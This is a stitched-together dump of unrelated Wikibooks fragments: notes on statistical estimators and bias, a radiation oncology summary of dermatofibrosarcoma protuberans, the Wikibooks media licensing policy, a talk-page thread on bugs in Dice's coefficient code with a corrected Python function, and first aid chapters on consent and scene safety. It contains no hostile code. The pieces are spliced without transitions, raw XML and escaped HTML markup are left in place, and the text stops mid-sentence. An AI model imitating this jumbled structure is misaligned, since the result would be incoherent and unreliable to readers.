Notice that the estimate &lt;math&gt;\hat\theta\,&lt;/math&gt; is a random variable (unlike the true parameter &lt;math&gt;\theta\,&lt;/math&gt;), since it depends on &lt;math&gt;X\,&lt;/math&gt;.

'''Examples'''
#Suppose &lt;math&gt;X_1,X_2,...,X_n\,&lt;/math&gt; follow independent Normal(''&amp;mu;'',''&amp;sigma;''&lt;sup&gt;2&lt;/sup&gt;). Then an estimator for the mean ''&amp;mu;'' is the sample mean &lt;math&gt;\sum X_i \over n\,&lt;/math&gt;.
#Suppose &lt;math&gt;X_1,X_2,...,X_n\,&lt;/math&gt; follow Uniform[''&amp;theta;'',''&amp;theta;''+1]. Then an estimator for ''&amp;theta;'' is &lt;math&gt;\min X_i\,&lt;/math&gt;. Another is &lt;math&gt;\max X_i-1\,&lt;/math&gt;. Yet another is &lt;math&gt;\frac{\sum X_i}{n} - \tfrac{1}{2}\,&lt;/math&gt;

Notice that the above definition does not restrict the point estimator to only the &quot;good&quot; ones. For example, according to the definition it is perfectly fine to estimate the mean &lt;math&gt;\mu\,&lt;/math&gt; in the above example as something absurd, like &lt;math&gt;10\sum X_i^2+\exp(X_1)\,&lt;/math&gt;. This freedom is in the definition is deliberate. In general, however, when we form point estimators we take some measure of goodness into account. It should be kept in mind that the point estimators will always be targeted to be close to the parameter it estimates, intuitively and if possible, formally.

A variety of methods are used to evaluate the effectiveness of a particular estimator.  One such measure of goodness is called the bias.  Bias is defined as in terms of the closeness of the expectation for the estimator to the actual parameter value.  For example if estimating a parameter, &lt;math&gt; \theta &lt;/math&gt; with an estimator, &lt;math&gt; W(x)&lt;/math&gt; then &lt;math&gt;bias(W(x))=E[W(x)-\theta] &lt;/math&gt;. When bias is zero, the estimator is called unbiased.

As an example we can show that the sample mean is unbiased for distribution mean. &lt;math&gt;E [\frac{1}{n}\sum X_i ]=\frac{1}{n}E[\sum X_i]= \frac{1}{n}\sum {E[ X_i]}=\frac{n}{n}E[X]=\mu &lt;/math&gt;.

Unbiasedness alone means the positive and negative errors balance out, but it is not the only measure of quality.  This can be thought of as accuracy, but we might also be concerned about precision.  Precision is often measured by the mean squared error, or MSE for short.  &lt;math&gt;MSE=E[(W(x)-\theta)^2]&lt;/math&gt;

&lt;big&gt;'''Dermatofibrosarcoma Protuberans'''&lt;/big&gt;


==Epidemiology==
*Cutaneous, locally aggressive, primarily low grade sarcoma
**~10% may contain a high-grade [[Radiation_Oncology/Sarcoma/Fibrosarcoma|fibrosarcoma]] component
**Low rate (&lt;5%) of metastasis; higher if fibrosarcoma component
*Rare, 2-6% of soft tissue sarcomas
*Adults in 30's
*Risk factors: pregnancy, arsenic exposure, acanthosis nigricans

==Clinical Presentation==
*Plaque-like areas of cutaneous thickening
*Skin-colored, red-brown, or violaceous, particularly at the margins
*May arise within pre-existing scar or tattoo
*As it slowly enlarges, becomes raised (&quot;protuberans&quot;), firm, and nodular (fixed to dermis, but moves over deeper structures)
**At diagnosis, &gt;75% are superficial and &lt;5cm diameter
*Slow, indolent growth, such that the lesion may be present for years
*Distribution:
**Trunk ~50%
**Lower extremity ~20%
**Upper extremity 15%
**Head and neck 15%

==Work Up==
*MRI helpful to estimate extent of deep extent
*CT not routinely necessary, unless bony invasion suspected
*Metastatic workup not routinely necessary, unless suspicion from H&amp;P

==Histology==
*Cell of origina is not well understood
**Histochemistry and electron microscopy suggest fibroblast lineage
**However, the cells are [[w:CD34|CD34]] positive, suggesting possibly dendritic lineage
**In comparison, dermatofibromas and desmoid tumors are CD34-
*The tumors show benign-appearing spindle cells, in an irregular patterns resembling a straw mat. In early lesions there is a tumor-free zone with epidermis 
*&gt;90% have a t(17;22) translocation, resulting in a fusion of PDFG-B driven by a highly expressed collagen promoter (COL1A1)
**Results in PDFGRb activation, which is tyrosine kinase receptor

==Staging==
*'''AJCC 7th Edition (2010)'''
**First edition to include DFSP
**Please see the [[Radiation_Oncology/Sarcoma/Staging|Soft Tissue Sarcoma staging]] page


*'''American Musculoskeletal Tumor Society Staging for DFSP'''
**Stage IA - Low or intermediate grade within the subcutaneous compartment
**Stage IB - Low or intermediate grade extending outside anatomic compartment
**Stage II - High grade histology

==Natural History==
*Tends to recur locally after excision alone
*Recur locally multiple times before metastasis; significant interval before development of metastases.
*Fibrosarcomatous changes predict for metastatic potential.

==Treatment Overview==
*Surgical resection is the primary treatment approach
**Historically, wide local excision with 3cm margins was recommended, down to and including fascia 
**Mohs mapping reveals fine tentacles of tumor, and is becoming favored due to preservation of cosmesis
**Some recommend modified Mohs to include a final path margin for permanent section
**Pooled local recurrence rate with adequate margin WLE or Mohs' is &lt;2%
**Recurrences tend to occur within 3 years of surgery
*Definitive RT not routinely; only couple reports available
*Adjuvant radiation is typically indicated if positive or close margins, further resection anatomically not possible if recurrence happens, or recurrent disease
*Given the high rate of t(17;22) leading downstream to a tyrosine kinase activation, efforts are under way to use Gleevec and other TKIs in this disease

***Retrospective. 53 consecutive patients. Surgery and preoperative (13%) or postoperative (87%) RT. Median tumor size 4 cm (1-25 cm). Preop dose 50 Gy, postop dose 60-66 Gy. Gross disease 7%, positive margin 30%. Median F/U 6.5 years
***Outcome: Recurrence 4%. 5-year and 10-year OS 98%. Fibrosarcomatous change not associated with risk of LR or DM
***Toxicity: 13%; moderate/severe complications 9% at 10 years

Dice's coefficient measures how similar a set and another set are.  It can be used to measure how similar two strings are in terms of the number of common bigrams (a bigram is a pair of adjacent letters in the string).  Below we give implementations of Dice's coefficient of two strings in different programming languages.

 * Released under the terms of the GNU GPL.

      <text xml:space="preserve">{{policy|WB:MEDIA}}

Most media files found online are copyrighted and cannot be used on Wikibooks. This policy explains our requirements for images and other media files used on Wikibooks. Media files which do not meet these requirements will be deleted as described in the [[WB:DP|deletion policy]].

== Media ==
Textbooks on Wikibooks are created under the terms of the [[WB:CC-BY-SA|Creative Commons Attribution-ShareAlike license]] so that anyone can freely use, modify and redistribute our books whether for free or for profit. Media files included in our books must be licensed under similar terms, using a &lt;span class=&quot;plainlinks&quot;&gt;[http://freedomdefined.org/Definition free license]&lt;/span&gt; or be in the public domain, and must be properly tagged. Limited use of [[#Non-free use|non-free use]] media files may also be allowed, but strongly discouraged.

{{anchor|freedoms}}
Media files and images [[commons:Commons:Upload|uploaded]] to [[commons:|Wikimedia Commons]], Wikibooks' shared media repository, unless otherwise stated by policy, must allow the four freedoms:

# the '''freedom to use''' the work and enjoy the benefits of using it
# the '''freedom to study''' the work and to apply knowledge acquired from it
# the '''freedom to make and redistribute copies''', in whole or in part, of the information or expression
# the '''freedom to make changes and improvements''', and to distribute derivative works

These freedoms may not be restricted, and attempting to restrict these freedoms for an image or media file is grounds for immediate deletion of that file.

===Scope===

Wikimedia Commons limits the scope of files that can be uploaded. They must comply with all of the following conditions. Every file:

* Must be a [[Commons:Commons:SCOPE#Must_be_a_media_file|media file]].
* Must be of an allowable [[Commons:Commons:SCOPE#Must_be_an_allowable_free_file_format|free file format]].
* Must be [[Commons:Commons:SCOPE#Must_be_freely_licensed_or_public_domain|freely licensed or public domain]].
* Must be [[Commons:Commons:SCOPE#Must_be_realistically_useful_for_an_educational_purpose|realistically useful for an educational purpose]].
* Must not contain only excluded educational content.

=== Free licenses ===
In countries which recognize copyright, most creative works are automatically protected by copyright. Usually the creator of the work maintains all rights to the work (&quot;all rights reserved&quot;) unless the creator gives or transfers their copyright to someone else. This may happen through contracts, licensing or by law. A '''free license''' is a license in which the copyright holders gives everyone the right to use, modify, redistribute, and create derivative works of their copyrighted work for commercial or non-commercial uses. Some free licenses may have additional conditions in exchange for these rights, such as requiring all derived works to use the same license or a compatible license, including the names of all copyright holders and not using the names of copyright holders as a selling point.

Media files uploaded to Wikimedia Commons under a free license must include:

# An appropriate free [[commons:Commons:Copyright tags|license template]]
# All [[commons:Commons:Licensing#License_information|information]] required by the appropriate free license, such as the name of the copyright holders and original source.

If you wish to use media or images that you created in a book on Wikibooks, you may use any free license, such as the [[WB:GFDL|GNU Free Documentation License]] or [[WB:CC-BY-SA|Creative Commons Attribution-ShareAlike license]]. You may also choose to dual license your work under multiple free licenses. Dual licensing, where possible, is the preferred method because it grants maximum freedom to the users of the media.  Wikimedia Commons has additional information at [[commons:Commons:Licensing|Commons:Licensing]].

=== Public domain ===
'''Public domain''' works typically have little or no protection under copyright laws, or are ineligible for copyright protection. Works may be placed in the public domain, or become public domain from the application of laws. Some countries may limit the use of public domain works or may not acknowledge public domain works at all. Public domain media files may be used if the media may be freely used, modified, and redistributed for commercial or non-commercial uses by anyone without restrictions or limitations.

Public domain media files uploaded to Wikimedia Commons must:

# Be in the [[commons:Commons:Licensing#Material_in_the_public_domain|public domain]] in ''both'' the United States and the country of origin of the work (if they differ).
# Include an appropriate [[commons:Commons:Copyright tags#Public domain|public domain template]].
# Include author [[commons:Commons:Licensing#License_information|information]].

If you are not the author, you must also include:

# A trusted link to where the media file can be obtained and can be easily verified as being in the public domain.
# The date the work was first created or first released.

Examples of public domain media:

* [[:File:&quot;Baron Renfrew&quot; 1825.jpg|Artwork]] or [[:File:(vadász) háló (heraldika).PNG|illustrations]] from the United States created by people who have been dead more than 70 years
* [[:File:0000.svg|Colors]], [[:File:25 qm Einheitskielyacht black.svg|symbols]], [[:File:Checkerboard pattern.svg|simple illustrations]], etc. ineligible for copyright

=== Non-free use ===
{{shortcut|WB:FU|WB:NFCC}}
'''Non-free use''' refers to the use of copyrighted works without the copyright owner's permission. Some countries allow copyrighted works to be used without permission under certain conditions. [[w:Fair use|Fair use]] in the US and [[w:Fair dealing|Fair dealings]] in the UK are two examples of such cases. The inclusion of non-free media files  is ''strongly discouraged'' and must only be used when:

# Free license or public domain alternatives aren't available;
# Creating a free licensed or public domain alternative is not an option;
# Books are enhanced by related media being used;
# A reasonable rationale has been given for using a non-free media file; and
# Deleting a non-free media file would render a book unusable.

Non-free media files must be [[Special:Upload|uploaded]] to Wikibooks and must include:

# Who the current copyright holder(s) is/are, and the copyright date(s).
# An appropriate [[Wikibooks:Templates/Files|non-free use template]].
# An easily identifiable [[Template:Non-free use rationale|explanation]] for why a non-free use media is required for each instance of its use.

Non-free use on Wikibooks excludes:

* Media files released under a free media license, and public domain media (as described by this policy).
* Media files &quot;used with permission&quot; since this infringes upon the four [[#freedoms|freedoms]] mentioned above.
* Media files created by you or other works not previously published.
* Media files that are not used in any book.
* Parody applications, such as screenshot parodies of proprietary software. These are outside [[WB:WIW|project scope]].
* Decorative uses and uses unrelated to the subject matter.
* Violations of any laws governing &quot;conditional use&quot; of copyright work in:
*# the country you're uploading from;
*# the country of the copyright holder;
*# the United States.

Examples of non-free uses that are acceptable include:

* Coat of arms, flags, seals, company logos, trademarks, etc. used in a book or module about the government or entity.
* Low-resolution screenshots or videos of proprietary software (or media used in accordance with the license the media is released under) inside books or modules about the software.
* Coins, banknotes, or stamps resized, partially covered, watermarked, or otherwise changed to comply with counterfeiting laws.

If you are unsure about non-free use, ask about it in the [[WB:HELP|Reading Room]].

      <comment>Showed incorrectness of all implementations, as was pointed out before.</comment>
      <text xml:space="preserve">These algorithms kind of work, but I'm not 100%. - [[User:Francis Tyers|Francis Tyers]] 15:01, 28 March 2007 (UTC)

Thanks for your code, it was very helpful. Two notes about the C++ code:

&lt;ol&gt;
&lt;li&gt;The &lt;code&gt;for&lt;/code&gt; loops shouldn't use &quot;unsigned&quot; because the code hangs on empty strings.&lt;/li&gt;
&lt;li&gt;The code is easy to read and perfect for illustrative purposes. However, for production code comparing large numbers of strings, performance can be dramatically improved by removing all memory allocations. This is possible because the bigram analysis can be done directly on the source strings by using raw pointers to either a 16-bit value (for a pair of single byte characters) or to a 32-bit value (for a pair of Unicode characters.) There is no need to create the arrays &lt;code&gt;string1_bigrams&lt;/code&gt; and &lt;code&gt;strings2_bigrams&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
 - Jim Beveridge 23:59, 20 August 2007 (UTC)

:Thanks for the feedback. Yes, I agree that an optimisation would be to use pointers instead of actually calculating the bigram arrays, but as you say it is more for illustration than actual production use :)

:Second point (your point 1.), I hadn't realised that, and actually it might make sense just to check the input strings first for zero lengths, and then return 0 if either string is 0 length. - [[User:Francis Tyers|Francis Tyers]] 15:42, 14 November 2007 (UTC)

:I would like to note that these implementations are quite incorrect (at least the Python version is, and I assume it is derived from the C++ version). Try using it with two strings where multiple occurrences of a element exist and you'll see what I mean: ('aaa', 'aaa') gives you 2.0, while a number between 0.0 and 1.0 is required. A fixed Python version can be found below:

&lt;source lang='python'&gt;
def dice_coefficient(a, b):
    a_bigrams = set([a[i:i+2] for i in range(len(a) - 1)])
    b_bigrams = set([b[i:i+2] for i in range(len(b) - 1)])
    intersection = a_bigrams.intersection(b_bigrams)
    total = ((len(a_bigrams)) + (len(b_bigrams)))
    dice  = float(len(intersection) * 2) / float(total)
    return dice
&lt;/source&gt;

The text on Wikipedia isn't very clear on what should be done with multiple occurrences of an element, but as a set can have only one occurrence of an element and the text mentions the intersection being done between sets the above code should be closer to the algorithm. Alex de Landgraaf 12:33, 25 May 2008

:You're right, it should be done on sets. I've changed the code to reflect this. The C++ version appears to have already been updated to fix this. - [[User:Francis Tyers|Francis Tyers]] ([[User talk:Francis Tyers|talk]]) 14:22, 7 June 2008 (UTC)

:: I used something close to the Simon White variant. Basically a pair is removed from the bigram list (not set) as it is matched. This avoid a problem where &quot;gc&quot; vs &quot;gcgc&quot; evaluates as 100%, instead of the correct 50%. My Javascript implementation fakes the removal by setting the bigram array element to null. I have not yet experimented with a fast &quot;proper&quot; Array removal (e.g. something derived for the John Ressig Array.remove()) yet. Maybe that could be faster. [[User:Stormrose|Stormrose]] ([[User talk:Stormrose|discuss]] • [[Special:Contributions/Stormrose|contribs]]) 11:58, 6 March 2012 (UTC)

:No, the wiki page is incorrect. According to Adamson and Boreham&lt;ref name=&quot;adamson74&quot;&gt;[http://www.sciencedirect.com/science/article/pii/0020027174900205 Adamson and Boreham], &quot;The use of an association measure based on character structure to identify semantically related pairs of words and document titles.&quot; ''Information Storage and Retrieval'' 10(7): 253-260, 1974.&lt;/ref&gt;, Brew and McKelvie&lt;ref name=&quot;brew96&quot;&gt;[http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.31.7741 Brew and McKelvie], &quot;Word-pair extraction for lexicography.&quot; ''Proceedings of the 2nd International Conference on New Methods in Language Processing'', pages 45-55, Ankara, Turkey, 1996.&lt;/ref&gt; and Kondrak&lt;ref name=&quot;kondrak05&quot;&gt;[http://dx.doi.org/10.1007/11575832_13 Kondrak], &quot;N-Gram Similarity and Distance.&quot; ''Proceedings of the 12th International Conference on String Processing and Information Retrieval'', pages 115-126, Buenos Aires, Argentina, 2005.&lt;/ref&gt;, the set of bigrams is actually a multi-set of bigrams. Adamson and Boreham make it perfectly clear that &quot;Multiple occurrences of the same [bigram] in one word were treated as distinct, ...&quot;. This can easily be seen if one looks at the similarity between &quot;GG&quot; and &quot;GGGGG&quot;, which should obviously not be 1. I suggest all implementations are adapted.

----

I've added a Javascript implementation. It relies on Array.push() and String.substr() which are standard. I did try a version that used Array.indexOf() instead of the inner &quot;j&quot; loop but that performed slower for the size strings used and Array.indexOf() requires more recent Javascript libraries.

== What is First Aid? ==
[[Image:First Aid Green Cross.png|thumb|A common first aid symbol]]
'''First aid''' is the provision of immediate care to a victim with an injury or illness, usually effected by a lay person, and performed within a limited skill range.  First aid is normally performed until the injury or illness is satisfactorily dealt with (such as in the case of small cuts, minor bruises, and blisters) or until the next level of care, such as a paramedic or doctor, arrives.

== Guiding principles ==
The key guiding principles and purpose of first aid, is often given in the mnemonic &quot;3 Ps&quot;.  These three points govern all the actions undertaken by a first aider.
*'''P'''revent further injury
*'''P'''reserve life
*'''P'''romote recovery

== Limitations ==
[[File:First Aid sign on an Israeli beach.jpg|thumb|left|First aid sign in Israel.]]
The nature of first aid means that most people will only have a limited knowledge, and in emergency situations, first aiders are advised to FIRST seek professional help. This is done by calling, or assigning an able bystander to call, an emergency number, which is 9-1-1 in many places. There is no worldwide common emergency number. The European Union has established 1-1-2 as the universal emergency number for all its member states. The GSM mobile phone standard designates 1-1-2 as an emergency number, so it will work on GSM systems to contact help, even in North America. In the United Kingdom and Republic of Ireland, the numbers 999, 112 and 911 all work in parallel. 
In emergency situations, it is important that the responder seek help immediately, seeking professional help by other means, if telephone contact is unavailable.  The risks of inadvertently doing further injury to a victim, and/or the responder sustaining injury themselves while applying aid, can often outweigh the benefits of applying immediate treatment.

==First Aid Training==
'''Reading this manual is no substitute for hands-on first aid training from an instructor qualified by a recognized organization.'''

Training programs vary from region to region, and we will highlight some of the main programs here.

==North America==
*'''Lifesaving Society''': The LSS, Canada's lifeguarding expert, provides first aid training geared toward both lifeguards and public
*'''Red Cross''': The RC has been a leading first aid training organization throughout North America
*'''St. John Ambulance''': provides first aid courses to the public, as well as more advanced training
*'''Canadian Ski Patrol''': provides first aid training for their ski patrollers as well as the public
*'''Heart and Stroke Foundation of Canada'''
*Corporate training programs: there are various corporations which provide their own programs
*Many ambulance and fire services offer basic first aid courses to those who are interested, contact your local Emergency Services Station for more information.

==United Kingdom==
*'''British Red Cross''': The British Red Cross is part of the worldwide organization, and provides personal and commercial first aid training 
*'''St John Ambulance''': SJA is the other main voluntary provider of first aid training in the UK

==Professional Levels Beyond First Aid==
Professional pre-hospital care is provided by local or regional Emergency Medical Services.  It is feasible for interested persons to undertake further training. Higher levels of training include:

*First Responder - The first responder level is often aimed at professionals, such as police officers, although in some areas, laypersons can become first responders, designated to reach emergencies before an ambulance
*Emergency Medical Technician - Most ambulance services worldwide qualify their staff as EMTs or an equivalent.  The additional skills they have vary between services, however most cover areas such as more advanced spinal care, resuscitation and patient handling.  In many countries, first aiders can attain this level of training through voluntary organizations or through private training.
*Paramedic - Paramedics are often the most highly qualified of the ambulance personnel, usually with a range of intravenous drugs and items such as intubation kits.  It is unlikely that any non-professional could achieve paramedic level.  In many countries, the title is protected, meaning that an unqualified person calling themselves a paramedic could face prosecution.

==Importance==
{{FA Best Practice|First aiders should always err towards treating a victim. Your actions may be covered by a [[First Aid/Legal Liability#Good Samaritan Laws|Good Samaritan Law]], and where this does not apply, most countries give much leeway to those acting in good faith.}}
Most people and cultures involve a certain amount of respect for a person's personal space.  This varies with cultural and personal attitude, but touching another person is generally considered to be rude, offensive or threatening unless their permission is gained.

As most first aid treatment does involve touching the victim, it is very important that the first aider gains their permission, so as to avoid causing offense or distress. In most jurisdictions, it may be considered battery if a first aider touches the victim without permission.

==Gaining consent==
The simplest way to gain consent is to ask the victim if they will allow you to treat them. Talk to the victim, and build up a rapport with them.  During this conversation, it is important to identify the following key points:
* '''Who you are''' - Start with your name, and explain that you are a trained first aider
* '''Why you are with them''' - They are likely to know they have an injury or illness (although you can't always assume this in the case of patients in emotional shock, children or those with learning difficulties), but explain to them that you would like to help with their injury or illness
* '''What you are going to do''' - Some first aid procedures can be uncomfortable (such as the sting which accompanies cleaning a wound with saline), so it is important to be honest with the patient about what you are doing, and if necessary, why it is important.

===Implied consent===
There are some cases where you can assume that the victim gives their consent to you treating them.  The key, unequivocal reason for assuming consent is if the patient:
*'''Is unconscious'''
*'''Has a very reduced level of consciousness'''
In these cases, you can perform any reasonable treatment within your level of training, and your position is protected in most jurisdictions.

===Judgment of consent===
There are also some cases where the first aider may have to exercise a level of judgment in treating a victim who may initially refuse.  Cases like this include when the victim is:
*'''Intoxicated'''
*'''Irrational''' (i.e. delusional, insane or confused due to the injuries)
*'''A minor''' (parent or guardian must give consent if present and able; otherwise consent is implied)
*'''Suffering from learning difficulties'''

In these judgment cases, the first aider must make a decision, even if the victim is refusing treatment. If this occurs it is very important to make a note of the decision, why it was taken, and why it was believed that the person was unfit to refuse treatment.  It is advisable to summon professional medical assistance if you believe the victim should be treated and is refusing, as medical professionals are experienced in dealing with people reluctant to accept treatment.

==Other influences of consent==
===Wishes of relatives===
In some cases, relatives may object to the treatment of their relative.  This can be a problematic area for the first aider, with several important factors to be considered.

In the first instance, it may not be any decision of the relative to choose to consent to first aid treatment.  In most countries, the only time this decision can be definitively taken is if the person requiring treatment is a child.

In other cases, the presumption for the first aider must be towards treating the victim, especially if they are unconscious .  

The other main consideration is if the person claiming to refuse consent on behalf of the victim is in fact a relative, or if they have the victim's best interests at heart.  In some cases, the person may have caused harm to the victim.  If in this case, you fear for your safety, or the person becomes aggressive, you should look after your own safety as a priority, and call for assistance from the police.

===Advance directive===
Some victims may have a statement recorded, called an advanced directive or living will, that they do not wish to be treated in the case of life threatening illness.  This can be recorded on a piece of paper, or on wearable items such as a bracelet.

The legal force of these items may vary widely between countries.  However, in the majority of cases they should follow a certain format, and be countersigned by a solicitor or notary public.

In any case, as suggested above, the first aider should always presume towards treating a victim, allowing health care professionals to make the final decision. Almost every first aid treatment will only extend life, rather than definitively save it, meaning you are usually not breaking the advance directive. This includes actions such as CPR, which simply extend the time until which definitive treatment will work - usually delivered by a health care professional, who can make their own clinical decision on any advance directive.

      <text xml:space="preserve">{{FirstAidHeader}}

==Awareness of Danger==
The first thing that anyone providing first aid should be aware of when entering a situation is the potential for danger to themselves.  This is especially important in first aid, as situations which have been dangerous to others carry an inherent risk of danger to those providing first aid.

Danger consists of:
*'''Environmental danger''' - A danger in the surroundings, such as falling masonry, broken glass, fast vehicles or chemicals.
*'''Human danger''' - Danger from people at the scene (including the victim) which can be intentional or accidental.

==Barrier Devices==
Keeping yourself protected is the first priority of any first aider.  The key is to always be aware of your surroundings and the situation, and be alert for any changes therein.

Once you are aware of the hazards, you can then take steps to minimize the risk to oneself.  One of the key dangers to a first aider is bodily fluids, such as blood, vomit, and urine, and feces, all of which pose a risk of cross contamination.  Body fluids and feces can carry infections and diseases, including, but not limited to, HIV and hepatitis.

===Gloves===
[[Image:Purple-nitrile-glove.jpg|thumb|A purple nitrile glove]]
The main tool of the first aider to avoid this risk is a pair of impermeable gloves. Gloves protect the key contact point with the victim (i.e. the hands) and allow you to work in increased safety. They protect not only from bodily fluids and feces, but from any dermatological infections or parasites that the victim may have.  

'''The first thing a first aider should do when approaching, or on their way to, a victim is to put on their gloves'''. 

Remember '''GO''' to the victim (Gloves On)
They are generally of three types:
*'''Nitrile''' - These gloves can come in any color (often purple or blue) and are completely impermeable to bodily fluids and feces. These are the gloves most recommended for use during victim contact. This material is also rated for dealing with chemical spills. If you ever need to deal with chemical burns, these are the gloves to use (you can brush off dry chemicals with gloved hands if you use nitrile). Nitrile gloves, however, are also the most expensive.
*'''Latex''' - Usually white gloves, often treated with powder to make them easier to get on or off.  These are not used as widely as they once were due to a prevalence of allergies to latex. Latex allergies are rarely [[First Aid/Anaphylactic Shock|life-threatening]]; if you must use latex gloves, ask the victim if they have a severe allergy to latex.
*'''Vinyl''' - Vinyl gloves are found in some kits; they should not be used for contact with body fluids or feces, though they are far better than nothing.  They should primarily be used for touching victims who do not have external body fluids or feces due to the glove's high break rate.  For this reason, some organizations recommend that they not be kept in first aid kits due to the risk of confusion.

===CPR Adjunct===
[[Image:CPR mask 2.jpg|thumb|A CPR pocket mask, with carrying case]]
The other key piece of protective equipment that should be in every first aid kit is an adjunct for helping to perform safe mouth-to-mouth resuscitation.

With mouth-to-mouth resuscitation, there is a high probability of bodily fluid contact, especially with regurgitated stomach contents and mouth borne infections.  A suitable mask will help to protect the rescuer from infections the victim may carry (and to some extent, protect the victim from the rescuer).  It also makes the performance of CPR less onerous (not wishing to perform mouth to mouth is a key reason cited for bystanders not attempting CPR).

CPR adjuncts come in a variety of forms, from small keyrings with a nitrile plastic shield, up to a fitted rescue 'pocket mask' complete with oxygen inlet, such as the one pictured.

===Other equipment===
Larger first aid kits, or those in high risk areas could contain additional equipment such as:
* '''Safety glasses''' - Prevents spurting or pooled fluid which could spray from coming in contact with the eyes.
* '''Apron or gown''' - Disposable aprons are common items in larger kits, and help protect the rescuers clothing from contamination.
* '''Filter breathing mask''' - Some large kits, especially in high risk areas such as chemical plants, may contain breathing masks which filter out harmful chemicals or pathogens.  These can be useful in normal first aid kits for dealing with victim who are suffering from communicable respiratory infections such as tuberculosis.
Oftentimes, all of these will be included as a part of a larger kit.  The kit should have a list of instructions on how to properly don/don off the equipment.  Follow these instructions and familiarize yourself with their use to prevent exposing yourself.

===Improvisation===
[[Image:Improvised first aid - bandage on leg.jpg|thumb|Improvised care for [[First Aid/External Bleeding|bleeding]].]]
Many first aid situations take place without a first aid kit readily to hand and it may be the case that a first aider has to improvise materials and equipment. The flexibility required in such situations is referenced in a common saying among rescue workers - &quot;Adapt, improvise, and overcome!&quot; As a general rule, some help is better than no help, especially in critical situations, so a key first aid skill is the ability to adapt to the situation, and use available materials until more help arrives.

Some common improvisations include:
*Gloves → plastic bags, dish gloves, leather work gloves (wash your hands with soap and water especially well after using these)
*Gauze → clean clothing, bedding or towel (but not paper products, such as paper towels or toilet paper)
*Splints → straight sections of wood, plastic, cardboard or metal
*Slings → the victim's shirt's bottom hem pinned to the center of their chest will immobilize a forearm or shoulder injury nicely
*Stretcher → a heavy blanket can be used to move a victim

The first thing you should do in any situation requiring first aid is to follow the three C’s: Check, Call, Care

To Check the victim, you must first survey the scene to ensure your safety. You need to notice the victims position as you approach him or her and any automatic red flags.  If you get hurt trying to help, you may only serve to make matters worse. Next, do a primary survey, which can be done while you are walking/running out on the field. This involves checking to determine if the victim is conscious or unconscious, has an open airway and is breathing, and has a pulse.  Once you have approached the victim, if they are unconscious you need to look, listen, and feel. Place your ear over the persons mouth, look for the rise and fall of the chest. Feel for the breath on your face, and listen for any moving air and possible blocked airway. If the victim is not breathing you will need to begin CPR. If they are breathing, but unconscious call 911 and continue to monitor vital signs until the arrive. If there is suspicion of a head or neck injury you would need to resume the C-spine position until EMS arrives. If the person is not breathing then CPR is the priority. If you determine the patient has a head or neck injury you should assume the C-spine position to keep them from making any unnecessary movements. If there is any suspicion of a head or neck injury and the athlete stays down there should be and EEMS called.  

After checking the victim, designate a person to Call EMS. If you are the only one, then you must do it yourself. You should be able to tell EMS your location, the situation at hand, and description of the patient. The 911 director would also need to know your name, and how they will be able to enter the facility. Also you should be able to give the EMS up to date directions to your current location. Remaining calm in this step is crucial. Never be the first one to hang up the phone on a 911 call.

After calling the EMS, provide appropriate Care until EMS arrives and takes over.  Continue monitoring the vital signs of the victim until EMS arrives.

It is important to do your best to stay calm and stay focused so that you will be able to provide the best care possible for the injured individual.</text>

First aiders are '''never''' required to place themselves in a situation which might put them in danger. Remember, you cannot help a victim if you become a victim yourself.

When a first aider is called upon to deal with a victim, they must always remember to safeguard themselves in the first instance and then assess the situation.  Only after these steps are completed can treatment of the victim begin.

When called to a scene, remember that your own personal safety is above all else. Before you enter a scene, put on personal protective equipment, especially impermeable gloves.

As you approach a scene, you need to be aware of the dangers which might be posed to you as a first aider, or to the victim.  These can include obviously dangerous factors such as traffic, gas or chemical leaks, live electrical items, buildings on fire or falling objects.  While many courses may focus on obvious dangers such as these, it is important not to neglect everyday factors which could be a danger. ''(ex. Gas fires, where in getting close to a victim could result in burns from the heated vapor.)''

There are also human factors, such as bystanders in the way, the victim not being co-operative, or an aggressor in the vicinity who may have inflicted the injuries on the victim. If these factors are present, retreat until the police are able to control the situation.

Always remember the big '''D''' for Danger.

Once you have assessed the scene for danger, you should continue to be aware of changes to the situation or environment that could present danger to you or your victim until you have left the scene.

If there are dangers which you cannot mitigate by your actions (such as falling masonry, an assailant, or a structure fire), then STAY CLEAR and call the emergency services.  Remember to '''never put yourself in harm's way'''.

===What has happened?===
As you approach the scene, your goal to gain as much information as possible about the incident. Try and build a mental &quot;picture&quot; of the situation in your head. Details you observe can help you care for your victim, especially if the injury or illness is not obvious.

Assess the '''Scene''' - Where are you? What stores, clubs, public buildings, etc. are nearby? Has anything here caused the injury? Does this area have motor vehicle traffic? Is this area known for violent crime? What time of day is it? What are the weather conditions?

Look for '''Clues''' - Things that could help you determine the reason for the patient's illness or injury may be obvious (such as an empty pill bottle between the patients legs) or subtle (shellfish - which many people are allergic to - in the victims food).

Get some '''History''' - If there are witnesses, ask them what's happened &quot;Did you see what happened here?&quot; and gain information such as how long ago it happened &quot;How long have they been like this?&quot;, but be sure to start your assessment and treatment of the victim simultaneous with your history taking.

Be sure to '''Listen''' - While working on a victim you may overhear information from witnesses in the crowd. An example of this would be an old man falling on the sidewalk, as you approach the scene you can hear someone say &quot;He was just walking and his legs went out from under him.&quot; But you may not see the person saying this. Everything should be taken into account should no witnesses want to become involved or you cannot ask questions. Note what is said and continue treatment.

===Responsiveness===
Once you are confident that there is minimal danger to yourself in the situation, the next step is to assess how well (if at all) your victim responds to you.

This can be started with an initial responsiveness check as you approach the victim.  This is best as a form of greeting and question, such as:

&quot;Hello, I'm here to help you. Are you alright?&quot;

The best result would be the victim looking at you and replying.  This means that the victim is alert at this time. 

In an emergency setting, the level of responsiveness is categorized by using what is called the '''AVPU''' scale, AVPU stands for the four possible categories they can fit into. They are either &quot;'''A'''lert&quot;, &quot;'''V'''erbal&quot;, alert to &quot;'''P'''ain&quot;, or &quot;'''U'''nresponsive&quot;' 

If the victim looks at you spontaneously, can communicate (even if it doesn't make sense) and seems to have control of their body, they can be termed '''Alert'''.

Key indicators on the victim are their:
*'''Eyes''' - Are they open spontaneously? Are they looking around? Do they appear to be able to see you? Do they look &quot;glassed over&quot;?
*'''Response to voice''' - Do they reply? Do they seem to understand? Can they obey commands, such as &quot;Open your eyes!&quot;? Do they know where they are or what happened to them?

If the victim is not alert, but you can get them to open their eyes, or obey a command by talking to them, then you can say that they are responsive to '''Voice''' - that is, they became alert upon you speaking to them.

If a victim does not respond to your initial greeting and question, you will need to try and get a response from them by carefully delivering pain.

